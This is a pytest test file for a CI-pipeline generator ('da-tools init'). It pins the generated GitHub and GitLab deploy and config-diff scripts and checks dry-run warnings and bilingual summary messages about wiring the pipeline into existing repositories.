        "ci": "both",
        "deploy": "kustomize",
        "rule_packs": ["mariadb"],
        "tenants": ["db-a"],
        "namespace": "monitoring",
        "da_tools_image": "ghcr.io/vencil/da-tools:latest",
    }
    base.update(over)
    return base


@pytest.mark.parametrize("lang", sorted(_DRYRUN_MARKERS))
@pytest.mark.parametrize("ci", CI_CHOICES)
def test_dry_run_warns_that_a_subdirectory_target_is_not_loaded(
    lang, ci, tmp_path, capsys, monkeypatch,
) -> None:
    """`-o alerting/` inside a work-tree: the warning must be there.

    `_gitlab_root_shell_status` reads `<output_dir>/.gitlab-ci.yml`, so with
    `-o sub/` it reports `create` and the second leg stays silent — while the
    REAL run warns. The flag whose job is "what will this do to my repo" must
    not be the one that hides it.
    """
    monkeypatch.setattr(ip, "_LANG", lang)
    subdir_marker, brownfield_marker = _DRYRUN_MARKERS[lang]
    repo = tmp_path / "repo"
    (repo / ".git").mkdir(parents=True)
    sub = repo / "alerting"
    sub.mkdir()

    out = _dry_run_output(_config(ci=ci), sub, capsys)

    assert subdir_marker in out, (
        f"--dry-run into `alerting/` (--ci {ci}) said nothing about the "
        f"output directory not being the repository root.\n{out}")
    assert "alerting" in out, f"the warning never names the subdirectory\n{out}"
    assert brownfield_marker not in out, (
        "the subdirectory case was reported as the brownfield-root case; "
        f"there is no root pipeline here at all.\n{out}")


@pytest.mark.parametrize("lang", sorted(_DRYRUN_MARKERS))
def test_dry_run_does_not_warn_about_a_correctly_wired_subdirectory(
    lang, tmp_path, capsys, monkeypatch,
) -> None:
    """⛔ The negative half. A split-pipeline repo that ALREADY includes us
    must not be told its config will not be loaded — and must not be promised
    a remedy the real run does not print.

    `--ci gitlab`, deliberately: GitHub is UNCONDITIONALLY unfinished in a
    subdirectory (its workflow must be moved and there is no `include:`
    indirection), so `github`/`both` warn here correctly and only the GitLab
    leg can be rescued from the root.
    """
    monkeypatch.setattr(ip, "_LANG", lang)
    subdir_marker, _ = _DRYRUN_MARKERS[lang]
    repo = tmp_path / "repo"
    (repo / ".git").mkdir(parents=True)
    sub = repo / "alerting"
    sub.mkdir()
    (repo / _GL_ROOT_SHELL).write_text(
        f"include:\n  - local: alerting/{_GL_PIPELINE.as_posix()}\n",
        encoding="utf-8", newline="\n")

    out = _dry_run_output(_config(ci="gitlab"), sub, capsys)

    assert subdir_marker not in out, (
        "a correctly wired split-pipeline repo was told by --dry-run that "
        "its config would not be loaded. The real run prints an all-clear "
        f"for this exact repo, so the two flags disagree.\n{out}")
    assert "⚠️" not in out, f"--dry-run warned about nothing at all.\n{out}"


@pytest.mark.parametrize("lang", sorted(_DRYRUN_MARKERS))
@pytest.mark.parametrize("ci", ["gitlab", "both"])
def test_dry_run_warns_that_an_existing_root_pipeline_is_left_untouched(
    lang, ci, tmp_path, capsys, monkeypatch,
) -> None:
    """Brownfield at the repository root — the second warning leg.

    The customer's own root `.gitlab-ci.yml` is never rewritten, so the
    generated pipeline stays inert until they wire it in by hand. Without
    this line a dry run over the shape `da-tools init` is documented as
    meeting reports a plain file list and nothing else.
    """
    monkeypatch.setattr(ip, "_LANG", lang)
    subdir_marker, brownfield_marker = _DRYRUN_MARKERS[lang]
    target = tmp_path / "brownfield"
    target.mkdir()
    (target / _GL_ROOT_SHELL).write_text(
        "stages: [build]\nbuild:\n  script: [echo hi]\n",
        encoding="utf-8", newline="\n")

    out = _dry_run_output(_config(ci=ci), target, capsys)

    assert brownfield_marker in out, (
        f"--dry-run over a repo that already has a root "
        f"{_GL_ROOT_SHELL.as_posix()} (--ci {ci}) never said the tool will "
        f"not touch it, so nothing told the reader the GitLab leg stays "
        f"inert until they hand-edit.\n{out}")
    assert subdir_marker not in out, (
        f"the root-level brownfield case was reported as a subdirectory "
        f"case.\n{out}")


@pytest.mark.parametrize("lang", sorted(_DRYRUN_MARKERS))
@pytest.mark.parametrize("ci", CI_CHOICES)
def test_dry_run_is_silent_when_there_is_nothing_to_warn_about(
    lang, ci, tmp_path, capsys, monkeypatch,
) -> None:
    """⛔ Anti-vacuity for both legs at once: a greenfield run at the
    repository root has no unfinished wiring, so neither warning may fire.

    Without this, "print both warnings unconditionally" satisfies the two
    positive tests above — and that is the mutation the production code was
    changed to remove.
    """
    monkeypatch.setattr(ip, "_LANG", lang)
    target = tmp_path / "greenfield"
    target.mkdir()

    out = _dry_run_output(_config(ci=ci), target, capsys)

    assert "⚠️" not in out, (
        f"--ci {ci} into a greenfield root warned about wiring that is not "
        f"missing.\n{out}")


def _normalized_commands(text: str) -> list[str]:
    """Shell text → one normalized command per entry (continuations folded)."""
    folded = re.sub(r"\\\s*\n\s*", " ", text)
    out = []
    for line in _strip_shell_comments(folded).splitlines():
        collapsed = " ".join(line.split())
        if collapsed:
            out.append(collapsed)
    return out


# ⛔ EXACT pin, and unlike most pins in this file it is NOT derived from a second
# source — the apply stage's body has no independent oracle to check it against.
# That makes listing the commands the correct trade-off here rather than a lapse
# into enumeration: the property being protected is "nobody edits the production
# apply path without saying so", and equality is what makes a deletion speak.
#
# Both legs are pinned because the guard that was missing here was missing on
# BOTH: measured, deleting `kubectl apply --dry-run=server` (and its echo) from
# the GitHub kustomize branch left 318 passed, and the GitLab branch carries the
# same dry-run with no assertion either. The old per-branch tests used
# `'kustomize build' in yaml_str`, so a whole branch vanishing turned red while
# anything INSIDE a branch could be rewritten freely.
_EXPECTED_GH_APPLY: dict[str, list[str]] = {
    "kustomize": [
        "kustomize build --load-restrictor LoadRestrictionsNone kustomize/overlays/prod > /tmp/manifests.yaml",
        "kubectl apply --dry-run=server -f /tmp/manifests.yaml",
        'echo "--- Dry-run passed. Applying... ---"',
        "kubectl apply -f /tmp/manifests.yaml",
        "kubectl rollout restart deployment/prometheus "
        "-n ${{ env.MONITORING_NS }}",
    ],
    "helm": [
        "helm upgrade --install threshold-exporter "
        "oci://ghcr.io/vencil/charts/threshold-exporter "
        "-f environments/prod/values.yaml -n ${{ env.MONITORING_NS }} "
        "--wait --timeout 5m",
    ],
    "argocd": [
        "argocd app sync dynamic-alerting --prune --timeout 300",
    ],
}

_EXPECTED_GL_APPLY: dict[str, list[str]] = {
    "kustomize": [
        "kustomize build --load-restrictor LoadRestrictionsNone kustomize/overlays/prod > /tmp/manifests.yaml",
        "kubectl apply --dry-run=server -f /tmp/manifests.yaml",
        "kubectl apply -f /tmp/manifests.yaml",
        "kubectl rollout restart deployment/prometheus -n $MONITORING_NS",
    ],
    "helm": [
        "helm upgrade --install threshold-exporter "
        "oci://ghcr.io/vencil/charts/threshold-exporter "
        "-f environments/prod/values.yaml -n $MONITORING_NS "
        "--wait --timeout 5m",
    ],
    "argocd": [
        "argocd app sync dynamic-alerting --prune --timeout 300",
    ],
}


# ⛔ `generate` is the stage whose OUTPUT is the product promise — the
# blast-radius comment a customer sees on their PR. The apply pins above were
# added because "apply is the highest-consequence text we generate"; that
# reasoning left `generate` with no WHAT-level assertion at all, and the
# asymmetry was introduced by the very commit that added them. Measured:
# deleting the entire `Config diff (blast radius)` step (10 lines) left
# 326 passed / 6 skipped — zero red. The `uses:` set pin catches "the sticky
# comment step was removed"; nothing caught "the step that produces its input
# was removed", which leaves a comment action pointing at a file nobody writes.
#
# Unlike the apply bodies this does NOT vary by deploy method (verified: the
# GitHub step list and the GitLab job set are identical across all three), so
# one pin covers the axis.
_EXPECTED_GH_GENERATE: list[str] = [
    'mkdir -p .output',
    # ⛔ `--user` is not cosmetic and must stay in the pin: this is the only
    # WRITABLE mount in the workflow, and the image ends `USER nonroot`
    # (uid 10001) while `mkdir -p .output` above runs as the runner user.
    # Without it the container cannot create its own output file.
    'docker run --rm --user $(id -u):$(id -g) -v ${{ github.workspace }}/${{ env.CONFIG_DIR }}:/data/conf.d:ro -v ${{ github.workspace }}/.output:/data/output ${{ env.DA_TOOLS_IMAGE }} generate-routes --config-dir /data/conf.d -o /data/output/alertmanager-routes.yaml --validate',
    ': "${RUNNER_TEMP:?RUNNER_TEMP is not set; this step writes its intermediate files there}"',
    'config_dir="${CONFIG_DIR%/}"',
    'mkdir -p .output/base/"$config_dir"',
    'if ! git cat-file -e "$BASE_SHA" 2>/dev/null; then',
    'echo "::error::base commit $BASE_SHA is not in this clone, so there is nothing to compare against. Two causes: the checkout was narrowed (this workflow sets fetch-depth: 0 — check it is still there), or the base ref was rewritten and that commit no longer exists, which is what a force-push, or re-running an old job whose recorded base commit is gone, looks like."',
    'exit 1',
    'fi',
    'git ls-tree "$BASE_SHA" -- "$config_dir" > "$RUNNER_TEMP"/entry.txt',
    'kind=$(cut -d\' \' -f2 "$RUNNER_TEMP"/entry.txt)',
    'if [ -z "$kind" ]; then kind=missing; fi',
    'if [ "$kind" = tree ]; then',
    'GIT_INDEX_FILE="$RUNNER_TEMP"/base.idx git read-tree "$BASE_SHA:$config_dir"',
    'GIT_INDEX_FILE="$RUNNER_TEMP"/base.idx git checkout-index -a -f --prefix=.output/base/"$config_dir"/',
    'elif [ "$kind" = missing ]; then',
    'echo "::notice::$config_dir does not exist at $BASE_SHA; treating this as the first import, so every tenant is reported as added"',
    'else',
    'echo "::error::$config_dir at $BASE_SHA is a $kind, not a directory, so no baseline can be built from it. A kind of \'commit\' means a submodule is mounted there; \'blob\' means either a file has that name, or the path is a symlink (git records those as blobs too). Reporting any of those as a first import would hide the fault."',
    'exit 1',
    'fi',
    'if [ ! -d "${{ env.CONFIG_DIR }}" ]; then',
    'echo "::error::CONFIG_DIR is set to \'${{ env.CONFIG_DIR }}\', which does not exist in this pull request\'s head commit. Either the workflow\'s CONFIG_DIR does not match where this repository actually keeps its tenant config, or this pull request removed that directory. Refusing to compare, because mounting a path that is not there yields an empty directory and a report that says \'no changes\' on every future run."',
    'exit 1',
    'fi',
    'set +e',
    'docker run --rm -v ${{ github.workspace }}/.output/base/${{ env.CONFIG_DIR }}:/data/conf.d.base:ro -v ${{ github.workspace }}/${{ env.CONFIG_DIR }}:/data/conf.d:ro -v ${{ github.workspace }}/.output:/data/output ${{ env.DA_TOOLS_IMAGE }} config-diff --old-dir /data/conf.d.base --new-dir /data/conf.d --format markdown > .output/blast-radius.md',
    'rc=$?',
    'set -e',
    'if [ "$rc" -gt 1 ]; then',
    'echo "::error::config-diff exited $rc (expected 0 or 1) — image pull, mount, or malformed config"',
    'exit "$rc"',
    'fi',
    'if [ ! -s .output/blast-radius.md ]; then',
    'echo "::error::config-diff exited $rc but produced an empty report; treating this as a failed run rather than publishing it"',
    'exit 1',
    'fi',
]

# ⛔ Was the GitLab blast-radius script, pinned line by line. The job is gone
# (#1358 / option C), so what is pinned now is its ABSENCE — see
# `test_generate_stage_body_is_pinned_on_both_legs`. Kept as an empty list
# rather than deleted so the shape of "what GitLab would have to emit" stays
# next to the GitHub pin it was always meant to be read against.
_EXPECTED_GL_GENERATE: list[str] = []


@pytest.mark.parametrize("ci,deploy", MATRIX)
def test_generate_stage_body_is_pinned_on_both_legs(generated, ci, deploy) -> None:
    """The stage that produces the customer-visible artifact, pinned like apply.

    ⛔ The two pins are asymmetric on purpose, and the asymmetry is the thing
    to read, not an oversight:

    * The **GitHub** pin encodes the fixed shape (#1358): `fetch-depth: 0` on
      the checkout, the base commit and the config directory looked up
      separately so a fault and a first import stop being the same outcome,
      and `config-diff`'s exit code handled against the documented contract.
    * The **GitLab** pin still encodes the broken `script:` shape, and its
      deferral has LOST the premise it rested on. Read this before touching
      the leg — the two blockers below used to be three, and the one that was
      removed is the one that made the other two harmless.

      Removed:

      - ~~#1357 — nothing includes `.gitlab-ci.d/dynamic-alerting.yml`, so the
        pipeline does not run at all.~~ **Fixed.** `da-tools init` now emits a
        root `.gitlab-ci.yml` that includes it; see
        `test_gitlab_root_shell_wires_the_pipeline`.
      - ~~The three `$DA_TOOLS_IMAGE` jobs pass the image as a bare scalar, so
        they inherit its ENTRYPOINT — which is the tool itself.~~ **Fixed
        (#1408).** The generator's own thrice-stated rule beside the
        apply-stage images was the correct half and the YAML was the wrong
        half; all three jobs now carry `entrypoint: [""]`, so they do reach
        their first script line. ⛔ Which means the remaining blocker is no
        longer masked by a job that died before running.

      Still live, and now CUSTOMER-VISIBLE rather than dormant:

      - The image has no `git`, so `git archive` cannot work. Installing it in
        `before_script` is not a way out either: the image runs as
        `USER nonroot`, and `apk add` there fails on a locked database. The
        `2>/dev/null || true` after it swallows the failure, so the baseline
        is empty and every merge request reports every tenant as ADDED —
        with a green pipeline.
      - `config-diff` is still invoked bare, so its documented rc=1 ("changes
        detected", the ordinary outcome) fails the job. That is #1358 on this
        leg, unfixed.

      ⛔ This is a deliberate, stated scope boundary of the #1357/#1408 change
      and NOT an argument that the leg is fine: the honest summary is that
      wiring the pipeline up turned two latent defects into live ones. The
      justification for leaving them is no longer "no customer can observe
      this" — it is "the fix needs a `git` in the published da-tools image,
      which is an image change, not a generator change". Do not restate the
      old justification; it is gone.

    Fixing the GitLab pin is therefore expected to be a later, deliberate edit
    here, exactly as this GitHub-side edit was — this pin is what will make
    that edit visible.
    """
    root = generated[(ci, deploy)]

    if ci in ("github", "both"):
        wf = yaml.safe_load((root / _GH_WORKFLOW).read_text(encoding="utf-8"))
        got: list[str] = []
        for step in wf["jobs"]["generate"]["steps"]:
            if "run" in step:
                got.extend(_normalized_commands(str(step["run"])))
        assert got == _EXPECTED_GH_GENERATE, (
            f"the GitHub generate body changed for --ci {ci} --deploy {deploy}.\n"
            f"  expected: {_EXPECTED_GH_GENERATE}\n  got:      {got}\n"
            "This stage produces the blast-radius comment. If the change is "
            "intended, update the pin in the same commit."
        )

        # ⛔ The pin above is built from `run:` blocks only, and the execution
        # test builds its own repository rather than running checkout — so
        # neither of them can see this line, and deleting it would be silent
        # in both. It is the other half of the baseline fix: the step's first
        # lookup fails without it, on a repository where nothing is actually
        # wrong.
        checkouts = [
            s for s in wf["jobs"]["generate"]["steps"]
            if str(s.get("uses", "")).startswith("actions/checkout")
        ]
        assert len(checkouts) == 1, (
            f"expected exactly one checkout in the generate job, got "
            f"{len(checkouts)}; the fetch-depth assertion below no longer "
            "knows which one to trust."
        )
        assert checkouts[0].get("with", {}).get("fetch-depth") == 0, (
            "the generate job's checkout must set `fetch-depth: 0`. The "
            "blast radius is computed against the PR's base commit, and the "
            "default depth-1 clone does not contain that object — the step "
            "then reports a fault on a perfectly healthy repository. "
            f"got with: {checkouts[0].get('with')!r}"
        )

        # ⛔ The pin above covers the PRODUCING side. The motivation written
        # beside it — "nothing caught 'the step that produces its input was
        # removed', which leaves a comment action pointing at a file nobody
        # writes" — is a statement about a LINK, and only one end of it was
        # fastened. Measured: repointing the commenter at
        # `.output/NOT-PRODUCED.md` left 341 passed, zero red.
        #
        # Derived on both ends: the produced set comes from the redirect targets
        # in the pinned script, the consumed path from the step's own `with:`.
        # Neither is hand-copied, so they cannot drift apart quietly.
        produced = {
            m.group(1)
            for cmd in got
            if (m := re.search(r">\s*(\S+)\s*$", cmd))
        }
        for step in wf["jobs"]["generate"]["steps"]:
            path = (step.get("with") or {}).get("path")
            if path is None:
                continue
            assert str(path) in produced, (
                f"the generate job's {step.get('uses', step.get('name'))!r} "
                f"consumes {path!r}, which no step in that job writes "
                f"(produced: {sorted(produced)}). The action fails at runtime "
                "on a file that was never created — a red pipeline on every PR."
            )

    if ci in ("gitlab", "both"):
        # ⛔ The GitLab leg emits NO blast-radius job, and that absence is the
        # assertion (#1358, option C — owner-approved).
        #
        # It used to emit one, and every line of it was pinned above. The job
        # could never have worked: GitLab runs `script:` inside
        # $DA_TOOLS_IMAGE, and that image is python:alpine plus the tool, with
        # no `git`. The baseline came from `git archive`, so it always failed;
        # `2>/dev/null || true` swallowed that, leaving an EMPTY baseline,
        # against which config-diff reports every tenant as newly added — and
        # then exits 1, its ordinary "changes found" answer, which the bare
        # call turned into a failed job.
        #
        # So the job produced an authoritative-looking report from a baseline
        # it never read, and went red doing it. While nothing loaded the
        # pipeline (#1357) none of that was observable; wiring it up made all
        # of it customer-visible at once, which is why the job comes out
        # rather than staying in.
        #
        # ⚠️ This is a REMOVAL, not a fix. Restoring the capability needs
        # `git` in the published image plus the GitHub leg's shape (base
        # commit and config dir looked up separately, config-diff's exit code
        # handled against its documented contract). Do that and this
        # assertion is what tells you to re-pin the body — do not simply
        # delete it.
        pipe = yaml.safe_load((root / _GL_PIPELINE).read_text(encoding="utf-8"))

        assert "generate" not in (pipe.get("stages") or []), (
            "the GitLab pipeline declares a `generate` stage again. If the "
            "blast-radius job is back, it needs `git` in $DA_TOOLS_IMAGE and "
            "the GitHub leg's two-lookup baseline — re-pin _EXPECTED_GL_GENERATE "
            "and rewrite this block rather than relaxing it (#1358)."
        )

        # ⛔ Every key that can carry shell, not just `script:`. The deferral
        # paragraph on `test_generate_stage_body_is_pinned_on_both_legs`
        # explicitly names `before_script` as the tempting way back in, and a
        # pin that reads only `script:` does not watch the door its own
        # docstring warns about. Measured: re-introducing both `git` and
        # `config-diff` through `before_script:` left the whole suite green.
        # `_READ_KEYS` above enumerates these from GitLab's schema for exactly
        # this reason — do not narrow this tuple to what the generator
        # happens to emit today.
        _SHELL_KEYS = ("before_script", "script", "after_script")
        for name, body in pipe.items():
            if not isinstance(body, dict):
                continue
            if not any(k in body for k in _SHELL_KEYS):
                continue
            script = " ".join(
                str(line) for key in _SHELL_KEYS for line in body.get(key, [])
            )
            assert "config-diff" not in script, (
                f"GitLab job {name!r} runs `config-diff` again. On this leg "
                "the baseline cannot be taken — the image has no git — so the "
                "report is computed against an empty directory (#1358)."
            )
            # ⚠️ Word boundary, not `"git "`. The join leaves no trailing
            # space on the final line, so a trailing-space test misses `git`
            # as the last token — measured: `- apk add --no-cache git`
            # appended as the last script line survived.
            assert not re.search(r"\bgit\b", script), (
                f"GitLab job {name!r} shells out to git, which is absent from "
                f"$DA_TOOLS_IMAGE. Whatever it guards will fail at runtime; on "
                "the old blast-radius job the failure was swallowed by "
                "`|| true` and the wrong answer shipped (#1358)."
            )

        # Anti-vacuity: the loop above proves nothing if there are no jobs.
        scripted = [
            name for name, body in pipe.items()
            if isinstance(body, dict) and "script" in body
        ]
        assert len(scripted) >= 3, (
            f"expected the GitLab pipeline to still carry its validate and "
            f"apply jobs, found {scripted}"
        )
        assert _EXPECTED_GL_GENERATE == [], (
            "_EXPECTED_GL_GENERATE is non-empty again but nothing pins it; "
            "wire it back into an assertion or reset it to []."
        )


def test_gitlab_root_shell_wires_the_pipeline(generated, tmp_path, capsys) -> None:
    """#1357, from the other side: this used to pin the DEFERRAL's premise.

    ⛔ Read the history, because the assertions inverted and an inverted
    assertion with the old comment above it is how a fix gets silently undone.
    The previous version of this test — `test_gitlab_deferral_premise_still_holds`
    — asserted that NO root `.gitlab-ci.yml` is created and that an existing one
    is left byte-identical, because the GitLab leg's broken `script:` body was
    being left unfixed on the premise that nothing loads it. Its own failure
    message said to fix the leg and rewrite this test "rather than deleting
    this assertion", so that is what happened: phase 1's polarity flipped,
    phase 2's did not, and both are re-argued below.

    **Phase 1 — greenfield.** `da-tools init` must write a root
    `.gitlab-ci.yml` whose body includes the generated pipeline. Not merely
    "a root file exists": the file must NAME the pipeline, because a root
    pipeline that does not include ours leaves the artifact exactly as inert
    as writing nothing did, with an existence check going green over it.

    **Phase 2 — brownfield, and its polarity is UNCHANGED on purpose.** The
    old test asserted an existing root file is left byte-identical as a
    tripwire (an append would have closed #1357 invisibly). That assertion is
    now the specification: option B says never edit a root pipeline we did not
    write. Overwriting deletes every job the customer runs; appending edits a
    document whose structure — `!reference` tags and all — this tool never
    parsed. So the same bytes-unchanged check stands, for the opposite reason,
    and what it is paired with is new: the summary must then TELL the customer
    the include, because "we left your file alone" and "your pipeline is
    wired" are only compatible if something says the missing line out loud.
    Without that pairing, `da-tools init` would meet a repo with an existing
    root pipeline — the shape it is documented as running against — and leave
    #1357 fully intact while every greenfield assertion above stayed green.
    """
    checked = 0
    for (ci, deploy), root in generated.items():
        if ci not in ("gitlab", "both"):
            continue
        checked += 1
        assert (root / _GL_PIPELINE).is_file(), (
            f"--ci {ci} --deploy {deploy} no longer writes {_GL_PIPELINE}. "
            "The pipeline moved; the include below now points at nothing."
        )
        shell = root / _GL_ROOT_SHELL
        assert shell.is_file(), (
            f"--ci {ci} --deploy {deploy} no longer writes a root "
            f"{_GL_ROOT_SHELL.as_posix()}. GitLab auto-loads that path and no "
            "other, so the generated pipeline is inert on the customer's "
            "instance — #1357, reopened."
        )
        body = shell.read_text(encoding="utf-8")
        # ⛔ Parsed, not grepped. A commented-out `#  - local: ...` line
        # contains the path and satisfies a substring test while GitLab loads
        # nothing — the same "mentions it" ≠ "reads it" gap the dead-variable
        # guard in this file was rebuilt to close.
        doc = yaml.safe_load(body)
        includes = doc.get("include") if isinstance(doc, dict) else None
        if isinstance(includes, (str, dict)):
            includes = [includes]
        locals_ = [
            (i.get("local") if isinstance(i, dict) else i)
            for i in (includes or [])
        ]
        assert _GL_PIPELINE.as_posix() in locals_, (
            f"the root {_GL_ROOT_SHELL.as_posix()} generated for --ci {ci} "
            f"--deploy {deploy} does not include {_GL_PIPELINE.as_posix()}; "
            f"its `include:` resolves to {locals_!r}. A root file that does "
            "not name the pipeline is exactly as inert as no root file."
        )

    # Anti-vacuity from an independent source: MATRIX, not the loop variable.
    # Without this, narrowing MATRIX to github-only would make the loop body
    # run zero times and this test would pass by describing nothing.
    expected = sum(1 for ci, _ in MATRIX if ci in ("gitlab", "both"))
    assert checked == expected > 0, (
        f"expected {expected} gitlab-bearing combinations from MATRIX, "
        f"examined {checked}"
    )

    # ── Phase 2 — initialise over a repository that ALREADY has a root
    # `.gitlab-ci.yml`, which is the shape `da-tools init` actually meets.
    existing = tmp_path / "preexisting-repo"
    existing.mkdir()
    root_ci = existing / _GL_ROOT_SHELL
    ORIGINAL = "stages: [build]\n\nbuild:\n  script:\n    - echo hi\n"
    root_ci.write_text(ORIGINAL, encoding="utf-8", newline="\n")

    config = {
        "ci": "gitlab",
        "deploy": "kustomize",
        "rule_packs": ["mariadb"],
        "tenants": ["db-a"],
        "namespace": "monitoring",
        "da_tools_image": "ghcr.io/vencil/da-tools:latest",
    }
    created = ip.run_init(config, str(existing))

    assert (existing / _GL_PIPELINE).is_file(), (
        "initialising over an existing repo stopped writing the pipeline."
    )
    assert root_ci.read_text(encoding="utf-8") == ORIGINAL, (
        "`da-tools init` modified an existing root .gitlab-ci.yml. It must "
        "not: overwriting deletes the customer's entire pipeline, and "
        "appending edits a document this tool never parsed. Surface the "
        "`include:` in the summary instead (option B, #1357)."
    )
    assert str(root_ci) not in created, (
        "run_init reported the pre-existing root .gitlab-ci.yml as a file it "
        "created. It did not write it — a created-list entry for an untouched "
        "file overstates --force's blast radius and makes the summary lie."
    )

    # The other half of "we left your file alone": say the missing line.
    ip._print_summary(created, str(existing), config)
    summary = capsys.readouterr().out
    for line in _GL_INCLUDE_SNIPPET.strip().splitlines():
        assert line.strip() in summary, (
            f"the post-init summary never prints {line.strip()!r}. The tool "
            "refused to wire the pipeline itself and then did not say how, "
            "which leaves #1357 fully intact on the brownfield path.\n"
            f"summary was:\n{summary}"
        )
    # ⛔ And it must not claim the pipeline already runs. This is the exact
    # sentence #1357 cites: the summary's last step said "Commit and push — CI
    # will automatically validate your config" unconditionally, which was false
    # for every `--ci gitlab` run.
    # ⛔ Stated as a property, because the literal it used to check is now
    # unreachable: production always interpolates a platform name, so the bare
    # "CI" fallback cannot be produced by any config `_validate_config`
    # accepts. Measured: forcing `gl_needs_manual` False made the summary say
    # "Commit and push — GitLab CI will automatically validate your config"
    # and this assertion stayed GREEN. It was also locale-vacuous — this test
    # never pins `_LANG`, so under a zh locale it could not fail at all.
    #
    # The live property: on a path where the customer still has to wire it up,
    # the closing line must not promise validation without naming that work.
    closing = [ln for ln in summary.splitlines() if "GitLab CI" in ln]
    assert closing, f"no closing platform line at all.\n{summary}"
    # Same property as the parametrized test: not the word "include" (the
    # remedy differs per path — move a file, convert a list, paste a block)
    # but the absence of an unconditional promise.
    assert not [
        ln for ln in closing
        if ("automatically validate" in ln or "會自動驗證" in ln)
        and "only" not in ln.lower() and "才會" not in ln
    ], ("the summary promises validation unconditionally while the customer "
        f"still has to wire it in.\n{summary}")


# The wiring the generator promises, read off the generator so this file cannot
# pin a snippet the tool stopped printing.
_GL_INCLUDE_SNIPPET = ip._GL_INCLUDE_SNIPPET


# ── The summary's wiring line, in both locales and on every branch ──────────
#
# ⛔ Why parametrized over language: `_print_summary` picks its strings from
# the module-level `_LANG`, which `detect_cli_lang()` sets from the
# environment at import. An assertion written only against the English text is
# vacuous whenever the suite runs under a zh locale — and zh is this
# project's primary customer language, so the unpinned half was the half that
# mattered. Every assertion below is made once per locale.
#
# ⛔ Why all four branches: the root-shell status selects both the sentence and
# the snippet SHAPE, and one of the four sentences is an all-clear. Only the
# brownfield needs-include branch was covered, so a mutation pinning
# `gl_root_written` to False — which makes a greenfield run report our OWN
# freshly-written shell as the customer's pre-existing pipeline, the exact
# confusion the production comment claims to guard against — left the whole
# suite green.
_SUMMARY_MARKERS = {
    # locale: (already-wired phrase, needs-work phrase)
    #
    # ⚠️ The needs-work marker is the WARNING glyph, not a verb. It used to be
    # "paste"/"貼入", which stopped matching the moment a fifth root-file state
    # (an `include:` that is not a list, where the instruction is "convert it",
    # not "paste this") forced neutral wording. A marker tied to one phrasing
    # grades the sentence; this one grades whether the step is flagged at all.
    'en': ("nothing to do", "⚠️"),
    'zh': ("無需額外動作", "⚠️"),
}


def test_summary_markers_cover_both_locales() -> None:
    """⛔ Anti-vacuity for the parametrize axis below.

    Deleting the 'zh' row silently removes three test cases and the suite
    stays green — which is precisely the regression the bilingual pinning was
    added to prevent.
    """
    assert set(_SUMMARY_MARKERS) == {"en", "zh"}, sorted(_SUMMARY_MARKERS)


# Every root-file shape the classifier distinguishes, and the `--ci` values
# that reach the GitLab branch at all.
#
# ⛔ This axis was `["greenfield", "wired", "needs-append"]` × `ci="gitlab"`,
# and the gaps were not cosmetic: dropping NEEDS_INCLUDE or UNPARSEABLE from
# the needs-work set, deleting the GitHub wiring line, and deleting the
# `--ci both` carve-out (which carries an eight-line comment arguing it is
# load-bearing) ALL left the suite green. NEEDS_INCLUDE is the plainest
# brownfield repo there is — a root pipeline with no `include:` key — and it
# is the shape `da-tools init` is documented as meeting.
_ROOT_SHAPES = {
    "greenfield": None,
    "wired": f"include:\n  - local: {_GL_PIPELINE.as_posix()}\n",
    "needs-append": "include:\n  - local: .gitlab-ci.d/theirs.yml\n",
    "needs-include": "stages: [build]\nbuild:\n  script: [echo hi]\n",
    "needs-convert": "include: 'templates/base.yml'\n",
    # `!reference` is the ordinary route into "did not parse". Both
    # sub-shapes matter: one already has an `include:` (the common case for a
    # pipeline sophisticated enough to use `!reference`) and must get the
    # LIST ITEM; one has none and can safely take the whole block.
    "unparseable-with-include": (
        "include:\n  - local: .gitlab-ci.d/theirs.yml\n"
        "job:\n  script:\n    - !reference [.setup, script]\n"
    ),
    "unparseable-no-include": "job:\n  script:\n    - !reference [.a, script]\n",
}



# ⛔ Both axes are load-bearing and neither could shrink noticeably.
# Demonstrated by composition: dropping `needs-convert` from the shape axis
# made "delete the worked-conversion branch entirely" invisible — and that
# branch is what stops a scalar-`include:` customer being handed a duplicate
# mapping key that deletes their SAST entries. Dropping `both` from the ci
# axis made "speak a GitLab-only manual step over the combined platform name"
# invisible. A shrunken axis reports fewer tests and stays green.
_SUMMARY_CI_VALUES = ["github", "gitlab", "both"]


@pytest.mark.parametrize("lang", sorted(_SUMMARY_MARKERS))
# ⛔ The SHARED constant, not a third hand-copied list. This axis used to
# spell `["github", "gitlab", "both"]` inline, so `test_summary_axes_cannot_
# shrink_silently` pinned the sibling axis while this one could quietly lose
# a value — and `github` is the leg with no `include:` indirection to rescue
# it, i.e. the one that needs the subdirectory warning most.
@pytest.mark.parametrize("ci", _SUMMARY_CI_VALUES)
def test_output_dir_below_the_repo_root_is_never_an_all_clear(
    lang, ci, tmp_path, capsys, monkeypatch,
) -> None:
    """⛔ The subdirectory leg was added to stop a false all-clear, and the
    all-clear itself was never pinned.

    `_enclosing_repo_root` was tested only as a pure function: no test drove
    `_print_summary` with an output dir inside a work-tree, so deleting the
    whole ⚠️ step, and dropping the subdirectory case from the "still has
    work" condition, both survived the suite. The second one restores
    "Commit and push — CI will automatically validate your config" for a run
    whose pipeline the repository root does not include — #1357 re-created
    and certified, which is the exact sentence this leg exists to prevent.

    GitHub needs it more than GitLab, not less: GitLab can be rescued from
    the root with `include:`, GitHub Actions has no such indirection.
    """
    monkeypatch.setattr(ip, "_LANG", lang)
    repo = tmp_path / "repo"
    (repo / ".git").mkdir(parents=True)
    sub = repo / "alerting"
    sub.mkdir()

    config = {
        "ci": ci, "deploy": "kustomize", "rule_packs": ["mariadb"],
        "tenants": ["db-a"], "namespace": "monitoring",
        "da_tools_image": "ghcr.io/vencil/da-tools:latest",
    }
    created = ip.run_init(config, str(sub))
    ip._print_summary(created, str(sub), config)
    summary = capsys.readouterr().out

    assert "⚠️" in summary, (
        f"a run into `alerting/` reported no warning at all.\n{summary}")
    assert "alerting" in summary, (
        f"the warning never names the subdirectory.\n{summary}")
    # ⛔ The load-bearing half: no unconditional promise anywhere.
    assert not [
        ln for ln in summary.splitlines()
        if ("automatically validate" in ln or "會自動驗證" in ln)
        and "only" not in ln.lower() and "才會" not in ln
    ], (f"the summary promised unconditional validation for CI config "
        f"written below the repository root.\n{summary}")


def test_summary_axes_cannot_shrink_silently() -> None:
    assert set(_ROOT_SHAPES) == {
        "greenfield", "wired", "needs-append", "needs-include",
        "needs-convert", "unparseable-with-include", "unparseable-no-include",
    }, sorted(_ROOT_SHAPES)
    assert _SUMMARY_CI_VALUES == ["github", "gitlab", "both"]


